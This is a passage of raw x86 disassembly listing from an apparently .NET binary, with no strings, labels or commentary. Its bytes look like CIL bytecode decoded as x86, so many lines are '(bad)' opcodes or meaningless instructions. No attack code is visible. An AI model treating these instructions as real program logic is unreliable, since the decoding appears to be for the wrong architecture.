  405213:	72 f2                	jb     0x405207
  405215:	0e                   	push   %cs
  405216:	00 70 0c             	add    %dh,0xc(%eax)
  405219:	2b 45 11             	sub    0x11(%ebp),%eax
  40521c:	06                   	push   %es
  40521d:	72 fe                	jb     0x40521d
  40521f:	0e                   	push   %cs
  405220:	00 70 16             	add    %dh,0x16(%eax)
  405223:	28 5b 00             	sub    %bl,0x0(%ebx)
  405226:	00 0a                	add    %cl,(%edx)
  405228:	16                   	push   %ss
  405229:	33 08                	xor    (%eax),%ecx
  40522b:	72 06                	jb     0x405233
  40522d:	0f 00                	(bad)
  40522f:	70 0c                	jo     0x40523d
  405231:	2b 2d 11 06 72 12    	sub    0x12720611,%ebp
  405237:	0f 00                	(bad)
  405239:	70 16                	jo     0x405251
  40523b:	28 5b 00             	sub    %bl,0x0(%ebx)
  40523e:	00 0a                	add    %cl,(%edx)
  405240:	16                   	push   %ss
  405241:	33 1d 07 17 8c 38    	xor    0x388c1707,%ebx
  405247:	00 00                	add    %al,(%eax)
  405249:	01 16                	add    %edx,(%esi)
  40524b:	28 d8                	sub    %bl,%al
  40524d:	00 00                	add    %al,(%eax)
  40524f:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  405252:	72 22                	jb     0x405276
  405254:	0f 00                	(bad)
  405256:	70 0c                	jo     0x405264
  405258:	2b 06                	sub    (%esi),%eax
  40525a:	72 42                	jb     0x40529e
  40525c:	0f 00                	(bad)
  40525e:	70 0c                	jo     0x40526c
  405260:	7e 11                	jle    0x405273
  405262:	00 00                	add    %al,(%eax)
  405264:	04 17                	add    $0x17,%al
  405266:	73 0d                	jae    0x405275
  405268:	01 00                	add    %eax,(%eax)
  40526a:	0a 13                	or     (%ebx),%dl
  40526c:	05 7e 22 00 00       	add    $0x227e,%eax
  405271:	04 28                	add    $0x28,%al
  405273:	4d                   	dec    %ebp
  405274:	00 00                	add    %al,(%eax)
  405276:	06                   	push   %es
  405277:	28 0e                	sub    %cl,(%esi)
  405279:	01 00                	add    %eax,(%eax)
  40527b:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  40527e:	11 05 08 28 11 00    	adc    %eax,0x112808
  405284:	00 0a                	add    %cl,(%edx)
  405286:	6f                   	outsl  %ds:(%esi),(%dx)
  405287:	0f 01 00             	sgdtl  (%eax)
  40528a:	0a 2b                	or     (%ebx),%ch
  40528c:	34 11                	xor    $0x11,%al
  40528e:	05 28 10 01 00       	add    $0x11028,%eax
  405293:	0a 6f fe             	or     -0x2(%edi),%ch
  405296:	00 00                	add    %al,(%eax)
  405298:	0a 11                	or     (%ecx),%dl
  40529a:	05 72 60 0f 00       	add    $0xf6072,%eax
  40529f:	70 28                	jo     0x4052c9
  4052a1:	4d                   	dec    %ebp
  4052a2:	00 00                	add    %al,(%eax)
  4052a4:	06                   	push   %es
  4052a5:	72 6c                	jb     0x405313
  4052a7:	0f 00                	(bad)
  4052a9:	70 28                	jo     0x4052d3
  4052ab:	28 00                	sub    %al,(%eax)
  4052ad:	00 0a                	add    %cl,(%edx)
  4052af:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b0:	fe 00                	incb   (%eax)
  4052b2:	00 0a                	add    %cl,(%edx)
  4052b4:	11 05 08 28 11 00    	adc    %eax,0x112808
  4052ba:	00 0a                	add    %cl,(%edx)
  4052bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4052bd:	0f 01 00             	sgdtl  (%eax)
  4052c0:	0a de                	or     %dh,%bl
  4052c2:	0c 11                	or     $0x11,%al
  4052c4:	05 2c 07 11 05       	add    $0x511072c,%eax
  4052c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ca:	5e                   	pop    %esi
  4052cb:	00 00                	add    %al,(%eax)
  4052cd:	0a dc                	or     %ah,%bl
  4052cf:	7e 25                	jle    0x4052f6
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	04 02                	add    $0x2,%al
  4052d5:	03 04 28             	add    (%eax,%ebp,1),%eax
  4052d8:	50                   	push   %eax
  4052d9:	00 00                	add    %al,(%eax)
  4052db:	06                   	push   %es
  4052dc:	0a 2b                	or     (%ebx),%ch
  4052de:	00 06                	add    %al,(%esi)
  4052e0:	2a 00                	sub    (%eax),%al
  4052e2:	00 00                	add    %al,(%eax)
  4052e4:	01 10                	add    %edx,(%eax)
  4052e6:	00 00                	add    %al,(%eax)
  4052e8:	02 00                	add    (%eax),%al
  4052ea:	65 02 56 bb          	add    %gs:-0x45(%esi),%dl
  4052ee:	02 0c 00             	add    (%eax,%eax,1),%cl
  4052f1:	00 00                	add    %al,(%eax)
  4052f3:	00 1b                	add    %bl,(%ebx)
  4052f5:	30 07                	xor    %al,(%edi)
  4052f7:	00 8b 00 00 00 31    	add    %cl,0x31000000(%ebx)
  4052fd:	00 00                	add    %al,(%eax)
  4052ff:	11 16                	adc    %edx,(%esi)
  405301:	0b 73 83             	or     -0x7d(%ebx),%esi
  405304:	00 00                	add    %al,(%eax)
  405306:	0a 0d 20 00 01 00    	or     0x10020,%cl
  40530c:	00 8d 4f 00 00 01    	add    %cl,0x100004f(%ebp)
  405312:	13 05 11 05 74 09    	adc    0x9740511,%eax
  405318:	00 00                	add    %al,(%eax)
  40531a:	1b 28                	sbb    (%eax),%ebp
  40531c:	55                   	push   %ebp
  40531d:	00 00                	add    %al,(%eax)
  40531f:	06                   	push   %es
  405320:	2d 08 72 77 03       	sub    $0x3777208,%eax
  405325:	00 70 0a             	add    %dh,0xa(%eax)
  405328:	de 5f 02             	ficomps 0x2(%edi)
  40532b:	16                   	push   %ss
  40532c:	28 58 00             	sub    %bl,0x0(%eax)
  40532f:	00 06                	add    %al,(%esi)
  405331:	8c 91 00 00 01 13    	mov    %ss,0x13010000(%ecx)
  405337:	04 28                	add    $0x28,%al
  405339:	52                   	push   %edx
  40533a:	00 00                	add    %al,(%eax)
  40533c:	06                   	push   %es
  40533d:	12 01                	adc    (%ecx),%al
  40533f:	28 53 00             	sub    %dl,0x0(%ebx)
  405342:	00 06                	add    %al,(%esi)
  405344:	28 56 00             	sub    %dl,0x0(%esi)
  405347:	00 06                	add    %al,(%esi)
  405349:	0c 02                	or     $0x2,%al
  40534b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40534e:	09 01                	or     %eax,(%ecx)
  405350:	00 0a                	add    %cl,(%edx)
  405352:	11 05 74 09 00 00    	adc    %eax,0x974
  405358:	1b 09                	sbb    (%ecx),%ecx
  40535a:	1b 16                	sbb    (%esi),%edx
  40535c:	08 28                	or     %ch,(%eax)
  40535e:	57                   	push   %edi
  40535f:	00 00                	add    %al,(%eax)
  405361:	06                   	push   %es
  405362:	26 09 6f 8a          	or     %ebp,%es:-0x76(%edi)
  405366:	00 00                	add    %al,(%eax)
  405368:	0a 0a                	or     (%edx),%cl
  40536a:	de 1d de 0c 28 25    	ficomps 0x25280cde
  405370:	00 00                	add    %al,(%eax)
  405372:	0a 28                	or     (%eax),%ch
  405374:	27                   	daa
  405375:	00 00                	add    %al,(%eax)
  405377:	0a de                	or     %dh,%bl
  405379:	00 02                	add    %al,(%edx)
  40537b:	84 8c 90 00 00 01 6f 	test   %cl,0x6f010000(%eax,%edx,4)
  405382:	0c 01                	or     $0x1,%al
  405384:	00 0a                	add    %cl,(%edx)
  405386:	0a 2b                	or     (%ebx),%ch
  405388:	00 06                	add    %al,(%esi)
  40538a:	2a 00                	sub    (%eax),%al
  40538c:	01 10                	add    %edx,(%eax)
  40538e:	00 00                	add    %al,(%eax)
  405390:	00 00                	add    %al,(%eax)
  405392:	02 00                	add    (%eax),%al
  405394:	6c                   	insb   (%dx),%es:(%edi)
  405395:	6e                   	outsb  %ds:(%esi),(%dx)
  405396:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  405399:	00 00                	add    %al,(%eax)
  40539b:	01 1b                	add    %ebx,(%ebx)
  40539d:	30 07                	xor    %al,(%edi)
  40539f:	00 95 00 00 00 32    	add    %dl,0x32000000(%ebp)
  4053a5:	00 00                	add    %al,(%eax)
  4053a7:	11 16                	adc    %edx,(%esi)
  4053a9:	0b 28                	or     (%eax),%ebp
  4053ab:	52                   	push   %edx
  4053ac:	00 00                	add    %al,(%eax)
  4053ae:	06                   	push   %es
  4053af:	0c 08                	or     $0x8,%al
  4053b1:	12 01                	adc    (%ecx),%al
  4053b3:	28 53 00             	sub    %dl,0x0(%ebx)
  4053b6:	00 06                	add    %al,(%esi)
  4053b8:	26 07                	es pop %es
  4053ba:	84 28                	test   %ch,(%eax)
  4053bc:	11 01                	adc    %eax,(%ecx)
  4053be:	00 0a                	add    %cl,(%edx)
  4053c0:	0d 09 14 72 76       	or     $0x76721409,%eax
  4053c5:	0f 00                	(bad)
  4053c7:	70 16                	jo     0x4053df
  4053c9:	8d 03                	lea    (%ebx),%eax
  4053cb:	00 00                	add    %al,(%eax)
  4053cd:	01 14 14             	add    %edx,(%esp,%edx,1)
  4053d0:	14 28                	adc    $0x28,%al
  4053d2:	41                   	inc    %ecx
  4053d3:	00 00                	add    %al,(%eax)
  4053d5:	0a 28                	or     (%eax),%ch
  4053d7:	11 00                	adc    %eax,(%eax)
  4053d9:	00 0a                	add    %cl,(%edx)
  4053db:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4053de:	04 28                	add    $0x28,%al
  4053e0:	23 00                	and    (%eax),%eax
  4053e2:	00 0a                	add    %cl,(%edx)
  4053e4:	28 12                	sub    %dl,(%edx)
  4053e6:	01 00                	add    %eax,(%eax)
  4053e8:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  4053eb:	09 14 72             	or     %edx,(%edx,%esi,2)
  4053ee:	96                   	xchg   %eax,%esi
  4053ef:	0f 00                	(bad)
  4053f1:	70 16                	jo     0x405409
  4053f3:	8d 03                	lea    (%ebx),%eax
  4053f5:	00 00                	add    %al,(%eax)
  4053f7:	01 14 14             	add    %edx,(%esp,%edx,1)
  4053fa:	14 28                	adc    $0x28,%al
  4053fc:	41                   	inc    %ecx
  4053fd:	00 00                	add    %al,(%eax)
  4053ff:	0a 28                	or     (%eax),%ch
  405401:	11 00                	adc    %eax,(%eax)
  405403:	00 0a                	add    %cl,(%edx)
  405405:	13 04 11             	adc    (%ecx,%edx,1),%eax
  405408:	04 28                	add    $0x28,%al
  40540a:	23 00                	and    (%eax),%eax
  40540c:	00 0a                	add    %cl,(%edx)
  40540e:	80 22 00             	andb   $0x0,(%edx)
  405411:	00 04 11             	add    %al,(%ecx,%edx,1)
  405414:	04 28                	add    $0x28,%al
  405416:	23 00                	and    (%eax),%eax
  405418:	00 0a                	add    %cl,(%edx)
  40541a:	0a de                	or     %dh,%bl
  40541c:	1e                   	push   %ds
  40541d:	de 1c 25 28 25 00 00 	ficomps 0x2528(,%eiz,1)
  405424:	0a 13                	or     (%ebx),%dl
  405426:	05 72 ae 0f 00       	add    $0xfae72,%eax
  40542b:	70 0a                	jo     0x405437
  40542d:	28 27                	sub    %ah,(%edi)
  40542f:	00 00                	add    %al,(%eax)
  405431:	0a de                	or     %dh,%bl
  405433:	07                   	pop    %es
  405434:	28 27                	sub    %ah,(%edi)
  405436:	00 00                	add    %al,(%eax)
  405438:	0a de                	or     %dh,%bl
  40543a:	00 06                	add    %al,(%esi)
  40543c:	2a 00                	sub    (%eax),%al
  40543e:	00 00                	add    %al,(%eax)
  405440:	01 10                	add    %edx,(%eax)
  405442:	00 00                	add    %al,(%eax)
  405444:	00 00                	add    %al,(%eax)
  405446:	02 00                	add    (%eax),%al
  405448:	75 77                	jne    0x4054c1
  40544a:	00 1c 29             	add    %bl,(%ecx,%ebp,1)
  40544d:	00 00                	add    %al,(%eax)
  40544f:	01 1e                	add    %ebx,(%esi)
  405451:	02 28                	add    (%eax),%ch
  405453:	17                   	pop    %ss
  405454:	00 00                	add    %al,(%eax)
  405456:	0a 2a                	or     (%edx),%ch
  405458:	1a 28                	sbb    (%eax),%ch
  40545a:	5d                   	pop    %ebp
  40545b:	00 00                	add    %al,(%eax)
  40545d:	06                   	push   %es
  40545e:	2a 00                	sub    (%eax),%al
  405460:	1b 30                	sbb    (%eax),%esi
  405462:	03 00                	add    (%eax),%eax
  405464:	30 00                	xor    %al,(%eax)
  405466:	00 00                	add    %al,(%eax)
  405468:	33 00                	xor    (%eax),%eax
  40546a:	00 11                	add    %dl,(%ecx)
  40546c:	14 fe                	adc    $0xfe,%al
  40546e:	06                   	push   %es
  40546f:	5b                   	pop    %ebx
  405470:	00 00                	add    %al,(%eax)
  405472:	06                   	push   %es
  405473:	73 14                	jae    0x405489
  405475:	01 00                	add    %eax,(%eax)
  405477:	0a 28                	or     (%eax),%ch
  405479:	15 01 00 0a 28       	adc    $0x280a0001,%eax
  40547e:	16                   	push   %ss
  40547f:	01 00                	add    %eax,(%eax)
  405481:	0a 17                	or     (%edi),%dl
  405483:	12 00                	adc    (%eax),%al
  405485:	16                   	push   %ss
  405486:	28 5a 00             	sub    %bl,0x0(%edx)
  405489:	00 06                	add    %al,(%esi)
  40548b:	de 0e                	fimuls (%esi)
  40548d:	25 28 25 00 00       	and    $0x2528,%eax
  405492:	0a 0b                	or     (%ebx),%cl
  405494:	28 27                	sub    %ah,(%edi)
  405496:	00 00                	add    %al,(%eax)
  405498:	0a de                	or     %dh,%bl
  40549a:	00 2a                	add    %ch,(%edx)
  40549c:	01 10                	add    %edx,(%eax)
  40549e:	00 00                	add    %al,(%eax)
  4054a0:	00 00                	add    %al,(%eax)
  4054a2:	00 00                	add    %al,(%eax)
  4054a4:	21 21                	and    %esp,(%ecx)
  4054a6:	00 0e                	add    %cl,(%esi)
  4054a8:	29 00                	sub    %eax,(%eax)
  4054aa:	00 01                	add    %al,(%ecx)
  4054ac:	1b 30                	sbb    (%eax),%esi
  4054ae:	03 00                	add    (%eax),%eax
  4054b0:	1a 00                	sbb    (%eax),%al
  4054b2:	00 00                	add    %al,(%eax)
  4054b4:	34 00                	xor    $0x0,%al
  4054b6:	00 11                	add    %dl,(%ecx)
  4054b8:	16                   	push   %ss
  4054b9:	12 00                	adc    (%eax),%al
  4054bb:	16                   	push   %ss
  4054bc:	28 5a 00             	sub    %bl,0x0(%edx)
  4054bf:	00 06                	add    %al,(%esi)
  4054c1:	de 0e                	fimuls (%esi)
  4054c3:	25 28 25 00 00       	and    $0x2528,%eax
  4054c8:	0a 0b                	or     (%ebx),%cl
  4054ca:	28 27                	sub    %ah,(%edi)
  4054cc:	00 00                	add    %al,(%eax)
  4054ce:	0a de                	or     %dh,%bl
  4054d0:	00 2a                	add    %ch,(%edx)
  4054d2:	00 00                	add    %al,(%eax)
  4054d4:	01 10                	add    %edx,(%eax)
  4054d6:	00 00                	add    %al,(%eax)
  4054d8:	00 00                	add    %al,(%eax)
  4054da:	00 00                	add    %al,(%eax)
  4054dc:	0b 0b                	or     (%ebx),%ecx
  4054de:	00 0e                	add    %cl,(%esi)
  4054e0:	29 00                	sub    %eax,(%eax)
  4054e2:	00 01                	add    %al,(%ecx)
  4054e4:	1e                   	push   %ds
  4054e5:	02 28                	add    (%eax),%ch
  4054e7:	17                   	pop    %ss
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	0a 2a                	or     (%edx),%ch
  4054ec:	13 30                	adc    (%eax),%esi
  4054ee:	05 00 80 00 00       	add    $0x8000,%eax
  4054f3:	00 35 00 00 11 73    	add    %dh,0x73110000
  4054f9:	17                   	pop    %ss
  4054fa:	01 00                	add    %eax,(%eax)
  4054fc:	0a 0a                	or     (%edx),%cl
  4054fe:	73 18                	jae    0x405518
  405500:	01 00                	add    %eax,(%eax)
  405502:	0a 13                	or     (%ebx),%dl
  405504:	06                   	push   %es
  405505:	72 77                	jb     0x40557e
  405507:	03 00                	add    (%eax),%eax
  405509:	70 0d                	jo     0x405518
  40550b:	1f                   	pop    %ds
  40550c:	20 8d 4f 00 00 01    	and    %cl,0x100004f(%ebp)
  405512:	13 05 11 06 7e 10    	adc    0x107e0611,%eax
  405518:	00 00                	add    %al,(%eax)
  40551a:	04 28                	add    $0x28,%al
  40551c:	6c                   	insb   (%dx),%es:(%edi)
  40551d:	00 00                	add    %al,(%eax)
  40551f:	06                   	push   %es
  405520:	6f                   	outsl  %ds:(%esi),(%dx)
  405521:	19 01                	sbb    %eax,(%ecx)
  405523:	00 0a                	add    %cl,(%edx)
  405525:	13 07                	adc    (%edi),%eax
  405527:	11 07                	adc    %eax,(%edi)
  405529:	16                   	push   %ss
  40552a:	11 05 16 1f 10 28    	adc    %eax,0x28101f16
  405530:	1a 01                	sbb    (%ecx),%al
  405532:	00 0a                	add    %cl,(%edx)
  405534:	11 07                	adc    %eax,(%edi)
  405536:	16                   	push   %ss
  405537:	11 05 1f 0f 1f 10    	adc    %eax,0x101f0f1f
  40553d:	28 1a                	sub    %bl,(%edx)
  40553f:	01 00                	add    %eax,(%eax)
  405541:	0a 06                	or     (%esi),%al
  405543:	11 05 6f 1b 01 00    	adc    %eax,0x11b6f
  405549:	0a 06                	or     (%esi),%al
  40554b:	18 6f 1c             	sbb    %ch,0x1c(%edi)
  40554e:	01 00                	add    %eax,(%eax)
  405550:	0a 06                	or     (%esi),%al
  405552:	6f                   	outsl  %ds:(%esi),(%dx)
  405553:	1d 01 00 0a 13       	sbb    $0x130a0001,%eax
  405558:	04 02                	add    $0x2,%al
  40555a:	28 b2 00 00 0a 0b    	sub    %dh,0xb0a0000(%edx)
  405560:	11 04 07             	adc    %eax,(%edi,%eax,1)
  405563:	16                   	push   %ss
  405564:	07                   	pop    %es
  405565:	8e b7 6f 1e 01 00    	mov    0x11e6f(%edi),%?
  40556b:	0a 28                	or     (%eax),%ch
  40556d:	6d                   	insl   (%dx),%es:(%edi)
  40556e:	00 00                	add    %al,(%eax)
  405570:	06                   	push   %es
  405571:	0d 09 0c 2b 00       	or     $0x2b0c09,%eax
  405576:	08 2a                	or     %ch,(%edx)
  405578:	13 30                	adc    (%eax),%esi
  40557a:	03 00                	add    (%eax),%eax
  40557c:	75 00                	jne    0x40557e
  40557e:	00 00                	add    %al,(%eax)
  405580:	36 00 00             	add    %al,%ss:(%eax)
  405583:	11 16                	adc    %edx,(%esi)
  405585:	80 27 00             	andb   $0x0,(%edi)
  405588:	00 04 73             	add    %al,(%ebx,%esi,2)
  40558b:	61                   	popa
  40558c:	00 00                	add    %al,(%eax)
  40558e:	0a 80 2a 00 00 04    	or     0x400002a(%eax),%al
  405594:	72 b6                	jb     0x40554c
  405596:	0f 00                	(bad)
  405598:	70 28                	jo     0x4055c2
  40559a:	6e                   	outsb  %ds:(%esi),(%dx)
  40559b:	00 00                	add    %al,(%eax)
  40559d:	06                   	push   %es
  40559e:	28 1f                	sub    %bl,(%edi)
  4055a0:	00 00                	add    %al,(%eax)
  4055a2:	0a 80 2b 00 00 04    	or     0x400002b(%eax),%al
  4055a8:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  4055ac:	0a 6f 4d             	or     0x4d(%edi),%ch
  4055af:	00 00                	add    %al,(%eax)
  4055b1:	0a 6f 1f             	or     0x1f(%edi),%ch
  4055b4:	01 00                	add    %eax,(%eax)
  4055b6:	0a 80 2c 00 00 04    	or     0x400002c(%eax),%al
  4055bc:	7f 2e                	jg     0x4055ec
  4055be:	00 00                	add    %al,(%eax)
  4055c0:	04 fe                	add    $0xfe,%al
  4055c2:	15 11 00 00 02       	adc    $0x2000011,%eax
  4055c7:	7f 2f                	jg     0x4055f8
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	04 16                	add    $0x16,%al
  4055cd:	6a 28                	push   $0x28
  4055cf:	20 01                	and    %al,(%ecx)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	19 8d 26 00 00 01    	sbb    %ecx,0x1000026(%ebp)
  4055d9:	0a 06                	or     (%esi),%al
  4055db:	16                   	push   %ss
  4055dc:	72 ca                	jb     0x4055a8
  4055de:	0f 00                	(bad)
  4055e0:	70 a2                	jo     0x405584
  4055e2:	06                   	push   %es
  4055e3:	17                   	pop    %ss
  4055e4:	72 67                	jb     0x40564d
  4055e6:	10 00                	adc    %al,(%eax)
  4055e8:	70 a2                	jo     0x40558c
  4055ea:	06                   	push   %es
  4055eb:	18 72 7c             	sbb    %dh,0x7c(%edx)
  4055ee:	11 00                	adc    %eax,(%eax)
  4055f0:	70 a2                	jo     0x405594
  4055f2:	06                   	push   %es
  4055f3:	80 32 00             	xorb   $0x0,(%edx)
  4055f6:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4055f9:	00 00                	add    %al,(%eax)
  4055fb:	00 13                	add    %dl,(%ebx)
  4055fd:	30 02                	xor    %al,(%edx)
  4055ff:	00 11                	add    %dl,(%ecx)
  405601:	00 00                	add    %al,(%eax)
  405603:	00 37                	add    %dh,(%edi)
  405605:	00 00                	add    %al,(%eax)
  405607:	11 02                	adc    %eax,(%edx)
  405609:	28 21                	sub    %ah,(%ecx)
  40560b:	01 00                	add    %eax,(%eax)
  40560d:	0a 16                	or     (%esi),%dl
  40560f:	fe 01                	incb   (%ecx)
  405611:	16                   	push   %ss
  405612:	fe 01                	incb   (%ecx)
  405614:	0a 2b                	or     (%ebx),%ch
  405616:	00 06                	add    %al,(%esi)
  405618:	2a 00                	sub    (%eax),%al
  40561a:	00 00                	add    %al,(%eax)
  40561c:	13 30                	adc    (%eax),%esi
  40561e:	04 00                	add    $0x0,%al
  405620:	47                   	inc    %edi
  405621:	00 00                	add    %al,(%eax)
  405623:	00 38                	add    %bh,(%eax)
  405625:	00 00                	add    %al,(%eax)
  405627:	11 02                	adc    %eax,(%edx)
  405629:	73 22                	jae    0x40564d
  40562b:	01 00                	add    %eax,(%eax)
  40562d:	0a 0b                	or     (%ebx),%cl
  40562f:	16                   	push   %ss
  405630:	02 17                	add    (%edi),%dl
  405632:	da 0d 0c 2b 29 07    	fimull 0x7292b0c
  405638:	72 65                	jb     0x40569f
  40563a:	12 00                	adc    (%eax),%al
  40563c:	70 7e                	jo     0x4056bc
  40563e:	2a 00                	sub    (%eax),%al
  405640:	00 04 72             	add    %al,(%edx,%esi,2)
  405643:	65 12 00             	adc    %gs:(%eax),%al
  405646:	70 6f                	jo     0x4056b7
  405648:	8b 00                	mov    (%eax),%eax
  40564a:	00 0a                	add    %cl,(%edx)
  40564c:	6f                   	outsl  %ds:(%esi),(%dx)
  40564d:	68 00 00 0a 6f       	push   $0x6f0a0000
  405652:	23 01                	and    (%ecx),%eax
  405654:	00 0a                	add    %cl,(%edx)
  405656:	6f                   	outsl  %ds:(%esi),(%dx)
  405657:	24 01                	and    $0x1,%al
  405659:	00 0a                	add    %cl,(%edx)
  40565b:	26 08 17             	or     %dl,%es:(%edi)
  40565e:	d6                   	salc
  40565f:	0c 08                	or     $0x8,%al
  405661:	09 31                	or     %esi,(%ecx)
  405663:	d3 07                	roll   %cl,(%edi)
  405665:	6f                   	outsl  %ds:(%esi),(%dx)
  405666:	8a 00                	mov    (%eax),%al
  405668:	00 0a                	add    %cl,(%edx)
  40566a:	0a 2b                	or     (%ebx),%ch
  40566c:	00 06                	add    %al,(%esi)
  40566e:	2a 00                	sub    (%eax),%al
  405670:	13 30                	adc    (%eax),%esi
  405672:	02 00                	add    (%eax),%al
  405674:	6f                   	outsl  %ds:(%esi),(%dx)
  405675:	00 00                	add    %al,(%eax)
  405677:	00 39                	add    %bh,(%ecx)
  405679:	00 00                	add    %al,(%eax)
  40567b:	11 16                	adc    %edx,(%esi)
  40567d:	80 2d 00 00 04 7f 2e 	subb   $0x2e,0x7f040000
  405684:	00 00                	add    %al,(%eax)
  405686:	04 7e                	add    $0x7e,%al
  405688:	2e 00 00             	add    %al,%cs:(%eax)
  40568b:	04 28                	add    $0x28,%al
  40568d:	04 00                	add    $0x0,%al
  40568f:	00 2b                	add    %ch,(%ebx)
  405691:	7d 34                	jge    0x4056c7
  405693:	00 00                	add    %al,(%eax)
  405695:	04 7f                	add    $0x7f,%al
  405697:	2e 00 00             	add    %al,%cs:(%eax)
  40569a:	04 16                	add    $0x16,%al
  40569c:	7d 35                	jge    0x4056d3
  40569e:	00 00                	add    %al,(%eax)
  4056a0:	04 7f                	add    $0x7f,%al
  4056a2:	2e 00 00             	add    %al,%cs:(%eax)
  4056a5:	04 28                	add    $0x28,%al
  4056a7:	64 00 00             	add    %al,%fs:(%eax)
  4056aa:	06                   	push   %es
  4056ab:	2c 15                	sub    $0x15,%al
  4056ad:	28 26                	sub    %ah,(%esi)
  4056af:	01 00                	add    %eax,(%eax)
  4056b1:	0a 7f 2e             	or     0x2e(%edi),%bh
  4056b4:	00 00                	add    %al,(%eax)
  4056b6:	04 7b                	add    $0x7b,%al
  4056b8:	35 00 00 04 da       	xor    $0xda040000,%eax
  4056bd:	80 2d 00 00 04 7e 2d 	subb   $0x2d,0x7e040000
  4056c4:	00 00                	add    %al,(%eax)
  4056c6:	04 16                	add    $0x16,%al
  4056c8:	31 1b                	xor    %ebx,(%ebx)
  4056ca:	7e 2d                	jle    0x4056f9
  4056cc:	00 00                	add    %al,(%eax)
  4056ce:	04 6c                	add    $0x6c,%al
  4056d0:	23 00                	and    (%eax),%eax
  4056d2:	00 00                	add    %al,(%eax)
  4056d4:	00 00                	add    %al,(%eax)
  4056d6:	40                   	inc    %eax
  4056d7:	8f 40 5b             	pop    0x5b(%eax)
  4056da:	28 97 00 00 0a b7    	sub    %dl,-0x48f60000(%edi)
  4056e0:	0a 2b                	or     (%ebx),%ch
  4056e2:	06                   	push   %es
  4056e3:	2b 04 16             	sub    (%esi,%edx,1),%eax
  4056e6:	0a 2b                	or     (%ebx),%ch
  4056e8:	00 06                	add    %al,(%esi)
  4056ea:	2a 00                	sub    (%eax),%al
  4056ec:	13 30                	adc    (%eax),%esi
  4056ee:	02 00                	add    (%eax),%al
  4056f0:	50                   	push   %eax
  4056f1:	00 00                	add    %al,(%eax)
  4056f3:	00 3a                	add    %bh,(%edx)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	11 2b                	adc    %ebp,(%ebx)
  4056f9:	49                   	dec    %ecx
  4056fa:	20 e8                	and    %ch,%al
  4056fc:	03 00                	add    (%eax),%eax
  4056fe:	00 28                	add    %ch,(%eax)
  405700:	22 00                	and    (%eax),%al
  405702:	00 0a                	add    %cl,(%edx)
  405704:	28 65 00             	sub    %ah,0x0(%ebp)
  405707:	00 06                	add    %al,(%esi)
  405709:	0b 7e 30             	or     0x30(%esi),%edi
  40570c:	00 00                	add    %al,(%eax)
  40570e:	04 07                	add    $0x7,%al
  405710:	31 1c 7f             	xor    %ebx,(%edi,%edi,2)
  405713:	2f                   	das
  405714:	00 00                	add    %al,(%eax)
  405716:	04 7e                	add    $0x7e,%al
  405718:	30 00                	xor    %al,(%eax)
  40571a:	00 04 6c             	add    %al,(%esp,%ebp,2)
  40571d:	28 dc                	sub    %bl,%ah
  40571f:	00 00                	add    %al,(%eax)
  405721:	0a 28                	or     (%eax),%ch
  405723:	27                   	daa
  405724:	01 00                	add    %eax,(%eax)
  405726:	0a 80 2f 00 00 04    	or     0x400002f(%eax),%al
  40572c:	2b 0f                	sub    (%edi),%ecx
  40572e:	28 65 00             	sub    %ah,0x0(%ebp)
  405731:	00 06                	add    %al,(%esi)
  405733:	28 a5 00 00 0a 80    	sub    %ah,-0x7ff60000(%ebp)
  405739:	31 00                	xor    %eax,(%eax)
  40573b:	00 04 07             	add    %al,(%edi,%eax,1)
  40573e:	80 30 00             	xorb   $0x0,(%eax)
  405741:	00 04 17             	add    %al,(%edi,%edx,1)
  405744:	2d b4 06 2a 1b       	sub    $0x1b2a06b4,%eax
  405749:	30 01                	xor    %al,(%ecx)
  40574b:	00 1a                	add    %bl,(%edx)
  40574d:	00 00                	add    %al,(%eax)
  40574f:	00 00                	add    %al,(%eax)
  405751:	00 00                	add    %al,(%eax)
  405753:	00 20                	add    %ah,(%eax)
  405755:	03 00                	add    (%eax),%eax
  405757:	00 80 28 69 00 00    	add    %al,0x6928(%eax)
  40575d:	06                   	push   %es
  40575e:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  405762:	25 00 00 0a 28       	and    $0x280a0000,%eax
  405767:	27                   	daa
  405768:	00 00                	add    %al,(%eax)
  40576a:	0a de                	or     %dh,%bl
  40576c:	00 2a                	add    %ch,(%edx)
  40576e:	00 00                	add    %al,(%eax)
  405770:	01 10                	add    %edx,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	00 00                	add    %al,(%eax)
  405776:	00 00                	add    %al,(%eax)
  405778:	0d 0d 00 0c 29       	or     $0x290c000d,%eax
  40577d:	00 00                	add    %al,(%eax)
  40577f:	01 1b                	add    %ebx,(%ebx)
  405781:	30 03                	xor    %al,(%ebx)
  405783:	00 41 00             	add    %al,0x0(%ecx)
  405786:	00 00                	add    %al,(%eax)
  405788:	3c 00                	cmp    $0x0,%al
  40578a:	00 11                	add    %dl,(%ecx)
  40578c:	20 00                	and    %al,(%eax)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	00 73 22             	add    %dh,0x22(%ebx)
  405793:	01 00                	add    %eax,(%eax)
  405795:	0a 0b                	or     (%ebx),%cl
  405797:	28 67 00             	sub    %ah,0x0(%edi)
  40579a:	00 06                	add    %al,(%esi)
  40579c:	0c 08                	or     $0x8,%al
  40579e:	07                   	pop    %es
  40579f:	20 00                	and    %al,(%eax)
  4057a1:	01 00                	add    %eax,(%eax)
  4057a3:	00 28                	add    %ch,(%eax)
  4057a5:	68 00 00 06 16       	push   $0x16060000
  4057aa:	31 09                	xor    %ecx,(%ecx)
  4057ac:	07                   	pop    %es
  4057ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4057ae:	8a 00                	mov    (%eax),%al
  4057b0:	00 0a                	add    %cl,(%edx)
  4057b2:	0a de                	or     %dh,%bl
  4057b4:	16                   	push   %ss
